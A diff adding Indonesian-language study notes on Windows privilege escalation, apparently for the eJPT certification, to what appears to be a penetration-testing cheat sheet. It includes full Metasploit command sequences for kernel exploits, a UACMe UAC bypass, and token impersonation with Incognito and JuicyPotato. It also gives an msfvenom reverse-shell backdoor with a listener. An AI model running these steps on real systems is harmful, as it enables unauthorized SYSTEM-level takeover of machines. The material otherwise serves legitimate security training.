@@ -830,6 +830,275 @@ unshadow /etc/passwd /etc/shadow > hashes.txt
 
 ### 6.1 Windows Privilege Escalation
 
+## Konsep Dasar
+ 
+**Privilege Escalation** = naik dari user biasa → Administrator / SYSTEM.
+ 
+### Integrity Level di Windows
+ 
+| Level | Keterangan | Contoh |
+|---|---|---|
+| Low | Sangat terbatas | Sandbox, browser |
+| Medium | User biasa | Shell awal setelah exploit |
+| High | Administrator aktif | Setelah UAC bypass |
+| SYSTEM | Tertinggi | `NT AUTHORITY\SYSTEM` |
+ 
+### Alur Umum
+ 
+```
+Dapat shell (Medium)
+      ↓
+Enumeration → cari celah
+      ↓
+Eksploitasi teknik PrivEsc
+      ↓
+NT AUTHORITY\SYSTEM
+```
+ 
+---
+ 
+## 1. Windows Kernel Exploits
+ 
+### Konsep
+ 
+Memanfaatkan **kerentanan di kernel Windows** yang belum di-patch. Cocok untuk sistem lama yang jarang diupdate.
+ 
+### Langkah
+ 
+```bash
+# 1. Cek versi OS di Meterpreter
+meterpreter > sysinfo
+ 
+# 2. Cari exploit yang cocok dengan versi OS
+meterpreter > run post/multi/recon/local_exploit_suggester
+ 
+# 3. Catat exploit yang disarankan, lalu background sesi
+meterpreter > background
+ 
+# 4. Load dan jalankan exploit
+msf > use <nama_exploit>
+msf > set SESSION <nomor_sesi>
+msf > run
+ 
+# 5. Verifikasi
+meterpreter > getuid
+# NT AUTHORITY\SYSTEM
+```
+ 
+### Tools Tambahan (manual)
+ 
+```bash
+# Upload Windows Exploit Suggester ke target
+# Di Kali:
+python windows-exploit-suggester.py --update
+python windows-exploit-suggester.py --database <file.xlsx> --systeminfo <systeminfo.txt>
+```
+ 
+### Contoh Exploit Umum
+ 
+| Exploit | Target OS |
+|---|---|
+| MS17-010 (EternalBlue) | Windows 7 / 2008 R2 |
+| MS16-032 | Windows 7–10 / 2008–2012 |
+| MS15-051 | Windows 7 / 2008 |
+ 
+### Tips
+ 
+- Selalu jalankan `local_exploit_suggester` dulu sebelum coba manual
+- Kernel exploit bisa crash sistem — gunakan sebagai opsi terakhir
+- Pastikan arsitektur exploit match dengan OS (x86/x64)
+---
+ 
+## 2. Bypassing UAC with UACMe
+ 
+### Konsep
+ 
+**UAC (User Account Control)** = mekanisme Windows yang meminta konfirmasi sebelum menjalankan aksi privilege tinggi.
+ 
+**UACMe** = tool berisi 40+ teknik bypass UAC, masing-masing memanfaatkan celah Windows yang berbeda.
+ 
+> Meskipun username "admin", tanpa bypass UAC kamu masih di Medium Integrity — banyak aksi yang tidak bisa dilakukan.
+ 
+### Persiapan Sebelum UAC Bypass
+ 
+```bash
+# 1. Pastikan sudah migrate ke explorer.exe (x64)
+meterpreter > pgrep explorer
+meterpreter > migrate <PID>
+ 
+# 2. Verifikasi sudah x64
+meterpreter > sysinfo
+# Meterpreter: x64/windows ✓
+ 
+# 3. Generate payload x64 di Kali
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=<IP_KALI> LPORT=4444 -f exe -o backdoor.exe
+ 
+# 4. Siapkan listener
+msf > use multi/handler
+msf > set payload windows/x64/meterpreter/reverse_tcp
+msf > set LHOST <IP_KALI>
+msf > set LPORT 4444
+msf > run
+```
+ 
+### Eksekusi UACMe
+ 
+```bash
+# 5. Upload Akagi64.exe dan backdoor.exe ke target
+meterpreter > upload Akagi64.exe C:\\Users\\admin\\AppData\\Local\\Temp
+meterpreter > upload backdoor.exe C:\\Users\\admin\\AppData\\Local\\Temp
+ 
+# 6. Jalankan UACMe
+meterpreter > shell
+C:\> C:\Users\admin\AppData\Local\Temp\Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
+ 
+# 7. Sesi baru masuk di listener → migrate ke lsass
+meterpreter > migrate <PID_lsass>
+ 
+# 8. Verifikasi
+meterpreter > getuid
+# NT AUTHORITY\SYSTEM ✓
+```
+ 
+### Pilih Nomor Metode UACMe
+ 
+| Nomor | Teknik | Target OS |
+|---|---|---|
+| 23 | `eventvwr.exe` | Win 7 / 2008 / 2012 ← paling sering di eJPT |
+| 30 | `fodhelper.exe` | Windows 10 |
+| 33 | `diskcleanup` scheduled task | Windows 10 |
+| 41 | `schtasks` COM hijack | Windows 10 baru |
+ 
+### Kenapa Harus Migrate ke explorer.exe Dulu?
+ 
+- Shell awal biasanya x86 (proses yang di-exploit 32-bit)
+- `explorer.exe` adalah proses x64 dengan token sesi interaktif user
+- Tanpa migrate → payload x64 tidak bisa dijalankan, UAC bypass gagal
+---
+ 
+## 3. Access Token Impersonation
+ 
+### Konsep
+ 
+**Access Token** = "kartu identitas" proses di Windows. Berisi info: siapa user-nya, privilege apa yang dimiliki, integrity level berapa.
+ 
+**Impersonation** = "mencuri" token milik proses lain yang privilege-nya lebih tinggi — misalnya token milik SYSTEM — dan menggunakannya untuk diri sendiri.
+ 
+### Privilege yang Dibutuhkan
+ 
+Teknik ini membutuhkan salah satu dari:
+ 
+| Privilege | Keterangan |
+|---|---|
+| `SeImpersonatePrivilege` | Boleh impersonate token user lain |
+| `SeAssignPrimaryTokenPrivilege` | Boleh assign token ke proses |
+ 
+```bash
+# Cek privilege yang tersedia
+meterpreter > getprivs
+# atau di shell:
+C:\> whoami /priv
+```
+ 
+### Teknik: Potato Attacks
+ 
+Jika `SeImpersonatePrivilege` tersedia, gunakan **Potato exploit**:
+ 
+| Tool | Target OS |
+|---|---|
+| `JuicyPotato` | Windows 7–10 / 2008–2016 |
+| `PrintSpoofer` | Windows 10 / 2019 |
+| `RoguePotato` | Windows 10 / 2019 |
+ 
+### Eksekusi via Metasploit (Incognito)
+ 
+```bash
+# 1. Load modul incognito
+meterpreter > load incognito
+ 
+# 2. List token yang tersedia
+meterpreter > list_tokens -u
+ 
+# 3. Impersonate token SYSTEM atau Administrator
+meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
+ 
+# 4. Verifikasi
+meterpreter > getuid
+# NT AUTHORITY\SYSTEM ✓
+ 
+# 5. Kalau getuid berhasil tapi privilege masih terbatas
+meterpreter > getsystem
+```
+ 
+### Eksekusi Manual (JuicyPotato)
+ 
+```bash
+# 1. Upload JuicyPotato.exe dan backdoor.exe ke target
+meterpreter > upload JuicyPotato.exe C:\\Temp
+meterpreter > upload backdoor.exe C:\\Temp
+ 
+# 2. Jalankan
+C:\Temp> JuicyPotato.exe -l 4445 -p backdoor.exe -t * -c <CLSID>
+ 
+# CLSID berbeda tiap versi Windows
+# Referensi: https://github.com/ohpe/juicy-potato/tree/master/CLSID
+```
+ 
+### Tips
+ 
+- Cek `SeImpersonatePrivilege` dulu — kalau tidak ada, teknik ini tidak akan jalan
+- Service account (IIS, SQL Server) hampir selalu punya `SeImpersonatePrivilege`
+- Kalau `impersonate_token` berhasil tapi proses tidak stabil, migrate ke proses SYSTEM yang stabil seperti `services.exe`
+---
+ 
+## Ringkasan Alur Pemilihan Teknik
+ 
+```
+Dapat shell di Windows
+        ↓
+Jalankan: local_exploit_suggester + whoami /priv
+        ↓
+        ├── OS lama, belum patch?
+        │     └── Kernel Exploit (MS17-010, MS16-032, dll)
+        │
+        ├── User adalah admin tapi UAC aktif?
+        │     └── UAC Bypass dengan UACMe (metode 23 untuk 2012)
+        │
+        └── SeImpersonatePrivilege tersedia?
+              └── Token Impersonation (Incognito / JuicyPotato)
+```
+ 
+---
+ 
+## Command Penting — Quick Reference
+ 
+```bash
+# Enumeration
+sysinfo                          # info OS dan arsitektur
+getuid                           # cek user saat ini
+getprivs                         # cek privilege
+run post/multi/recon/local_exploit_suggester  # cari exploit otomatis
+ 
+# Migration
+pgrep explorer                   # cari PID explorer
+migrate <PID>                    # pindah ke proses lain
+ 
+# UAC Bypass
+Akagi64.exe 23 <path_payload>    # jalankan UACMe metode 23
+ 
+# Token Impersonation
+load incognito                   # load modul
+list_tokens -u                   # list token tersedia
+impersonate_token "NT AUTHORITY\\SYSTEM"  # impersonate token
+ 
+# Eskalasi ke SYSTEM
+getsystem                        # otomatis coba berbagai teknik
+migrate <PID_lsass>              # migrate ke lsass.exe
+```
+ 
+--- 
+
 #### Enumerasi Manual
 
 ```cmd
